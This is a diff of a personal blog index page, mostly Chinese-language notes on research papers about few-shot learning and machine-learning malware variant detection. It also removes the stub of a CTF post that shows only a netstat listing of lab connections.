@@ -156,6 +156,413 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot24/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/Few-Shot24/" class="post-title-link" itemprop="url">小样本变种检测FewM-HGCL</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-05-06 20:43:22" itemprop="dateCreated datePublished" datetime="2024-05-06T20:43:22+08:00">2024-05-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-05-12 21:51:03" itemprop="dateModified" datetime="2024-05-12T21:51:03+08:00">2024-05-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>Chen Liu, B. Li, J. Zhao, Z. Zhen, X. Liu and Q. Zhang, “FewM-HGCL : Few-Shot Malware Variants Detection Via Heterogeneous Graph Contrastive Learning,” in IEEE Transactions on Dependable and Secure Computing, doi: 10.1109/TDSC.2022.3216902.</p>
+</blockquote>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>BPNN,API嵌入</p>
+<p>1.以往的方法忽略了各种特征之间的上下文关联，容易被多态性变体规避。恶意软件各个<strong>实体间细粒度的交互信息</strong>，能揭示恶意软件变体的内在模式。</p>
+<p>传统机器学习方法无法检测隐蔽少样本的变种、零日攻击。没有使用API调用的属性信息。</p>
+<p>2.以往的对比学习方法关注图数据或者同构图结构化数据的生成，对复杂的异构图结构数据生出的研究很少。</p>
+<p>传统的对比方法关注同构图正负实例生成，忽略了异构依赖关系。与同构图中的单个依赖关系不同，异构图中各种恶意软件实体之间存在许多<strong>非线性和分层异构依赖关系。</strong></p>
+<p><img src="/categories/ML/Few-Shot24/1714997021345.png" alt="1714997021345"></p>
+<p>process, API, file, network, and signature，五种实体之间的六种关系。</p>
+<p>CRAO命名规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;type&gt;://][&lt;platform&gt;/]&lt;family&gt;[.&lt;group&gt;][.&lt;length&gt;].&lt;variant&gt;[&lt;modifiers&gt;][!&lt;comment&gt;]</span><br></pre></td></tr></table></figure>
+<p>对比学习的直觉是利用<strong>数据固有的共现关系</strong>       作为自我监督，通过其内在的判别机制学习匹配模式并捕获不匹配模式。</p>
+<p>基于异构图的监督学习检测方法可检测传统变异</p>
+<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><p>图神经网络对于关系型数据效果很好。</p>
+<p>每个样本的异构图[1]都会通过图像增强{API属性掩蔽（语义信息，对属性矩阵Xi)、交互增强和元路径采样（结构信息，对临接矩阵Ai进行转换)  }生成m个正样例[2]，从其他恶意软件家族挑出n个负样例[3]，对这三种对象，分别采用一个图注意力网络生成 图级别的嵌入表示，进而组合成图样本对，分析样本对的一致性，给出样本的家族预测。</p>
+<p>定义5  基于原路径的显示领域（从目标节点出发，沿着元路径能够到达的节点集合）；基于交互增强的领域（显示领域的0阶邻居+1阶进程邻居）</p>
+<h2 id="一些结论："><a href="#一些结论：" class="headerlink" title="一些结论："></a>一些结论：</h2><p>You等[32]认为节点邻域重构属于局部-全局对比，过分强调邻域信息会破坏结构信息。</p>
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>1.如何对小样本实例的大貌和细粒度进行建模；</p>
+<p>2.如何设计恶意软件变体异构图的有效的正负样本对</p>
+<p>3.如何学习到异构图的图级表示。  GAT</p>
+<p>4.判别方法</p>
+<h3 id="1-基于特征哈希的密集属性异构图"><a href="#1-基于特征哈希的密集属性异构图" class="headerlink" title="1.基于特征哈希的密集属性异构图"></a>1.基于特征哈希的密集属性异构图</h3><blockquote>
+<p>[42]对于大规模多任务学习的特征哈希方法</p>
+</blockquote>
+<h3 id="2-三种数据增强方式"><a href="#2-三种数据增强方式" class="headerlink" title="2.三种数据增强方式"></a>2.三种数据增强方式</h3><p>3.2.1随机屏蔽所有API节点的部分属性。</p>
+<p><img src="/categories/ML/Few-Shot24/1715000885600.png" alt="1715000885600"></p>
+<p>Lm表示遮罩位置矩阵，V表示服从正态分布的随机高斯噪声。</p>
+<p>3.2.2 交互增强</p>
+<p>同质图数据增强都集中在原始图的随机扩散；</p>
+<p><img src="/categories/ML/Few-Shot24/1715001378314.png" alt="1715001378314"></p>
+<p>第3~6行，对进程节点和邻居的关系权置为1，兼顾语义和搜索速度。</p>
+<p>3.2.3 基于(具有区分性的预定义的六种)元路径采样所有可达节点</p>
+<h3 id="4-基于经济动量策略的判别器"><a href="#4-基于经济动量策略的判别器" class="headerlink" title="4.基于经济动量策略的判别器"></a>4.基于经济动量策略的判别器</h3><blockquote>
+<p>[23]无监督视觉表示学习的动量对比</p>
+</blockquote>
+<p>节省计算开销，三个编码器和三个投影头的计算-&gt;只反向传播GATo和MLPo，其余模型的参数基于动量进行更新。</p>
+<p><img src="/categories/ML/Few-Shot24/1714999475271.png" alt="1714999475271"></p>
+<p>i的正例的损失：</p>
+<p><img src="/categories/ML/Few-Shot24/1714999935976.png" alt="1714999935976"></p>
+<p>预设的温度参数τ，</p>
+<p>最终损失，是m个正例的平均损失-n个负例的平均损失。</p>
+<p><img src="/categories/ML/Few-Shot24/1715000060740.png" alt="1715000060740"></p>
+<p><img src="/categories/ML/Few-Shot24/1715000479195.png" alt="1715000479195"></p>
+<h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>小样本恶意软件数据集要求：</p>
+<ul>
+<li><p>涵盖足够多的家族</p>
+</li>
+<li><p>每个家族应该有一个最新的实例</p>
+</li>
+<li><p>样本分布符合真实场景</p>
+</li>
+</ul>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>1.传统特征+传统模型（CNN，SVM+RBF,RNN+LR)</p>
+<p>2.异构图+GNN，足够多的数据的监督学习</p>
+<p>3.自监督方式：API+生成对抗自动编码器,Gaph Contrastive Coding</p>
+<p>BIG 2015数据集不适用于基于API的分析方法，它仅包含脱敏静态签名特征，只具有PP（进程fork)，PAP（进程调用APi)，PSP（进程签名）等三种元路径。RNN+LR、API+AAE生成对抗自动编码器、MatchGNet、MG-DVD均基于动态行为分析方法，因此BIG 2015数据集不能用于上述4种基线方法的实验验证</p>
+<p>运行10次，比较平均结果。</p>
+<p>1.四种常用数据集上的多分类任务，</p>
+<p>2.其他的单个数据集上的二分类任务，</p>
+<p>3、单个数据集上的（1,5）少样本任务，</p>
+<p>4.未知恶意软件检测，以已知类型：未知类型=5:4,5:3的比例划分；</p>
+<p>5.三种子方法的蒸馏实验（准确率的提高量gain） 动量值=0.990</p>
+<p>6.时间空间偏差的实验（采用前半年数据集测试后半年的采用后半年数据集训练测试前半年的）</p>
+<p>结论：恶意软件检测方法都<strong>能够根据对未来变种的学习知识来检测过去的恶意软件</strong>，但很难根据过去的恶意软件预测未来的变种。</p>
+<p>7.基于t-SNE，t-分布式随机邻居嵌入的可视化</p>
+<p><strong>结构级增强比语义级增强（遮罩）更有利于异构图对比学习。</strong></p>
+<p>a.各个方法在各个数据集上的运行时间比较，</p>
+<p>b.mask参数设置，0.5最佳，对属性密集的数据集作用更大；FewM-HGCl在shot变化时准确率的影响，1到5明显升高，10个时基本到头。</p>
+<p>layers的设置，不同数据集不同，L_Big-2015=2；embedding=64时最佳。</p>
+<h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><p>无法处理反沙箱恶意软件，无法处理复杂的打包恶意软件</p>
+<p>新思路：利用不同实体之间的特定时间依赖关系进行动态建模和在线检测</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[22] A. v. d. Oord, Y. Li, and O. Vinyals, “Representation learning with contrastive predictive coding,” arXiv preprint arXiv:1807.03748, 2018.</p>
+<p>[23]K. He, H. Fan, Y. Wu, S. Xie, and R. Girshick, “Momentum contrast for unsupervised visual representation learning,” in Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition, 2020, pp. 9729–9738.</p>
+<p>[32] Y. You, T. Chen, Y. Sui, T. Chen, Z. Wang, and Y. Shen, “Graph contrastive learning with augmentations,” Advances in Neural Information Processing Systems, vol. 33, pp. 5812–5823, 2020</p>
+<p>[42]K. Weinberger, A. Dasgupta, J. Langford, A. Smola, and J. Attenberg, “Feature hashing for large scale multitask learning,” in Proceedings of the 26th annual international conference on machine learning, 2009, pp. 1113–1120.</p>
+<p> Li, Zhenguo et al. “Meta-SGD: Learning to Learn Quickly for Few Shot Learning.” <em>ArXiv</em> abs/1707.09835 (2017): n. pag. </p>
+<p> Sun, Qianru et al. “Meta-Transfer Learning for Few-Shot Learning.” <em>2019 IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)</em> (2018): 403-412. </p>
+<p> Liu, Yanbin et al. “Learning to Propagate Labels: Transductive Propagation Network for Few-Shot Learning.” <em>International Conference on Learning Representations</em> (2018). </p>
+<p> Ye, Han-Jia et al. “Few-Shot Learning via Embedding Adaptation With Set-to-Set Functions.” <em>2020 IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)</em> (2018): 8805-8814. </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/MCV01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/MCV01/" class="post-title-link" itemprop="url">恶意软件变种分类数据集构建01</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-03-11 15:46:58 / Modified: 18:45:58" itemprop="dateCreated datePublished" datetime="2024-03-11T15:46:58+08:00">2024-03-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>Decoding the Secrets of Machine Learning in Malware Classification: A Deep Dive into Datasets, Feature Extraction, and Model Performance</p>
+</blockquote>
+<p>数据集的分布，样本数量和家族数量对结果的影响，特征之间的互补性（权重设置以及是否有重复。）</p>
+<p>  数据集：670家族×每家族100样本</p>
+<p>特征提取方法：</p>
+<p> VGG-16, RestNet-18, and EfficientNet-B0 </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot27/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/Few-Shot27/" class="post-title-link" itemprop="url">Strong Teacher</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-02-19 14:53:22" itemprop="dateCreated datePublished" datetime="2024-02-19T14:53:22+08:00">2024-02-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-02-27 17:53:30" itemprop="dateModified" datetime="2024-02-27T17:53:30+08:00">2024-02-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>Few-Shot Learning With a Strong Teacher,  2024-Mar ,IEEE TRANSACTIONS ON PATTERN ANALYSIS AND MACHINE INTELLIGENCE </p>
+</blockquote>
+<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>背景（元学习存在的问题）：</p>
+<p>采样的查询样本为元学习器提供的监督信息不足；</p>
+<p>元学习器随着样本数目增多，效果的增加不如强学习器。</p>
+<p>思路：</p>
+<p>改变元学习器的目标为“表现接近强学习器”。</p>
+<p>具体做法：</p>
+<p>每一个采样的小样本任务都设置一个目标强学习器，用目标强学习器去监督元学习器。</p>
+<p>关键：如何构造强学习器？</p>
+<h2 id="3-MODEL"><a href="#3-MODEL" class="headerlink" title="3.MODEL"></a>3.MODEL</h2><h3 id="相对熵"><a href="#相对熵" class="headerlink" title="相对熵"></a>相对熵</h3><p>KL 散度（Kullback–Leibler divergence，缩写 KLD）是一种统计学度量，表示的是一个概率分布相对于另一个概率分布的差异程度，在信息论中又称为相对熵。</p>
+<p><img src="/categories/ML/Few-Shot27/1709012342365.png" alt="1709012342365"></p>
+<p>可以衡量用Q表示P带来的信息损失。</p>
+<h3 id="最近质心-分类器NC-Nearest-Centroid"><a href="#最近质心-分类器NC-Nearest-Centroid" class="headerlink" title="最近质心 分类器NC(Nearest Centroid)"></a>最近质心 分类器NC(Nearest Centroid)</h3><p>1.求类平均值</p>
+<p>2.度量距离</p>
+<h3 id="元训练阶段，最佳分类器的训练"><a href="#元训练阶段，最佳分类器的训练" class="headerlink" title="元训练阶段，最佳分类器的训练"></a>元训练阶段，最佳分类器的训练</h3><p>增强老师（效果更稳定）或者弱化学生，都可以提高蒸馏或自训练表现。</p>
+<p>a.变动 输入图片的尺寸（图片size越大，准确率越高）只在构造和查询最佳分类器时增大图片尺寸，不对元学习器的构造和各任务分类器的生成进行该操作，以和基线统一标准。</p>
+<p>b.对输入做自动增强</p>
+<blockquote>
+<p>[102]E. D. Cubuk, B. Zoph, D. Mane, V. Vasudevan, and Q. V. Le, “Autoaugment: Learning augmentation strategies from data,” in CVPR, 2019, pp. 113–123.</p>
+</blockquote>
+<p>样本集的分割比例参考</p>
+<blockquote>
+<p>S. Ravi and H. Larochelle, “Optimization as a model for few-shot learning,” in ICLR, 2017.</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot26/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/Few-Shot26/" class="post-title-link" itemprop="url">小样本学习经典论文16-20</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-02-14 14:53:22 / Modified: 14:59:51" itemprop="dateCreated datePublished" datetime="2024-02-14T14:53:22+08:00">2024-02-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>Deep-Ensemble and Multifaceted Behavioral Malware Variant Detection Model</p>
+<p>嵌入垃圾API或者完全不适用API，会导致程序表示为稀疏向量。缺少API追踪并不意味着程序是良性，所以API调用对程序的准确表达和检测是无效的。</p>
+</blockquote>
+<p>它含有的有效信息可能有但并不多，仅仅基于API调用序列去检测程序是不可靠的。</p>
+<blockquote>
+<p>API本身并不能够反映恶意样本的恶意行为。</p>
+</blockquote>
+<p>但可以基于其进行一定的猜测。</p>
+<blockquote>
+<p> 每种行为特征（模式）都能够体现恶意软件的某些方面，但模式之间互有重叠。综合这些特征可以获得更好的检测结果。这些重叠的模式会在建立模型时带来噪音。</p>
+</blockquote>
+<p>控制流图包含了API调用序列或者其他作者自行的代码逻辑，比API调用包含更多信息。</p>
+<p>三个恶意软件程序报告</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Mac%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%96%87%E7%AB%A0%E7%9A%84%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -279,79 +686,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot26/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/ML/Few-Shot26/" class="post-title-link" itemprop="url">小样本学习经典论文16-20</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-12-30 20:43:22" itemprop="dateCreated datePublished" datetime="2023-12-30T20:43:22+08:00">2023-12-30</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-08 17:12:10" itemprop="dateModified" datetime="2023-12-08T17:12:10+08:00">2023-12-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot25/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -407,85 +741,6 @@
 
       
           <p> Schönfeld, Edgar et al. “Generalized Zero- and Few-Shot Learning via Aligned Variational Autoencoders.” <em>2019 IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)</em> (2018): 8239-8247. </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot24/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/ML/Few-Shot24/" class="post-title-link" itemprop="url">小样本学习经典论文6-10</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-12-15 20:43:22" itemprop="dateCreated datePublished" datetime="2023-12-15T20:43:22+08:00">2023-12-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-09 10:52:18" itemprop="dateModified" datetime="2023-12-09T10:52:18+08:00">2023-12-09</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Satorras, Victor Garcia and Joan Bruna. “Few-Shot Learning with Graph Neural Networks.” <em>ArXiv</em> abs/1711.04043 (2017): n. pag. </p>
-<p> Li, Zhenguo et al. “Meta-SGD: Learning to Learn Quickly for Few Shot Learning.” <em>ArXiv</em> abs/1707.09835 (2017): n. pag. </p>
-<p> Sun, Qianru et al. “Meta-Transfer Learning for Few-Shot Learning.” <em>2019 IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)</em> (2018): 403-412. </p>
-<p> Liu, Yanbin et al. “Learning to Propagate Labels: Transductive Propagation Network for Few-Shot Learning.” <em>International Conference on Learning Representations</em> (2018). </p>
-<p> Ye, Han-Jia et al. “Few-Shot Learning via Embedding Adaptation With Set-to-Set Functions.” <em>2020 IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)</em> (2018): 8805-8814. </p>
-<h1 id="Graph-Neural-Networks"><a href="#Graph-Neural-Networks" class="headerlink" title="Graph Neural Networks"></a>Graph Neural Networks</h1><h2 id="Meta-SGD"><a href="#Meta-SGD" class="headerlink" title="Meta-SGD"></a>Meta-SGD</h2><p>one step adaptation</p>
 
       
     </div>
@@ -628,7 +883,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-12 19:21:52" itemprop="dateModified" datetime="2023-12-12T19:21:52+08:00">2023-12-12</time>
+                <time title="Modified: 2024-02-01 13:06:59" itemprop="dateModified" datetime="2024-02-01T13:06:59+08:00">2024-02-01</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -654,7 +909,10 @@
           <blockquote>
 <p>Y. Chai, L. Du, J. Qiu, L. Yin and Z. Tian, “Dynamic Prototype Network Based on Sample Adaptation for Few-Shot Malware Detection,” in IEEE Transactions on Knowledge and Data Engineering, vol. 35, no. 5, pp. 4754-4766, 1 May 2023, doi: 10.1109/TKDE.2022.3142820.</p>
 </blockquote>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>动态检测能够根据执行路径和行为获取更全面的信息，但是执行耗时，且可以被反沙箱手段躲避；静态速度快，但是依赖反汇编引擎，且很难从混淆和加壳的软件中提取正确的语义或有代表性的特征。</p>
 <p>Filtered LargePE dataset.</p>
+<h2 id="参考文献中可读内容"><a href="#参考文献中可读内容" class="headerlink" title="参考文献中可读内容"></a>参考文献中可读内容</h2><p>TESSERACT: Eliminating experimental bias in malware classification across space and time</p>
+<p>跨越时间和空间的恶意软件分类偏差消解</p>
 
       
     </div>
@@ -909,171 +1167,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/" class="post-title-link" itemprop="url">msf后渗透维持</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-11-28 14:19:49" itemprop="dateCreated datePublished" datetime="2023-11-28T14:19:49+08:00">2023-11-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-12-06 19:26:38" itemprop="dateModified" datetime="2023-12-06T19:26:38+08:00">2023-12-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\22154&gt;netstat -ano|findstr 11300</span><br><span class="line">  TCP    172.30.48.1:53633      172.30.56.107:11300    ESTABLISHED     21716</span><br><span class="line">  TCP    172.30.48.1:53699      172.30.56.107:11300    ESTABLISHED     5212</span><br><span class="line">  TCP    172.30.48.1:53704      172.30.56.107:11300    ESTABLISHED     17876</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/1701172793037.png" alt="1701172793037"></p>
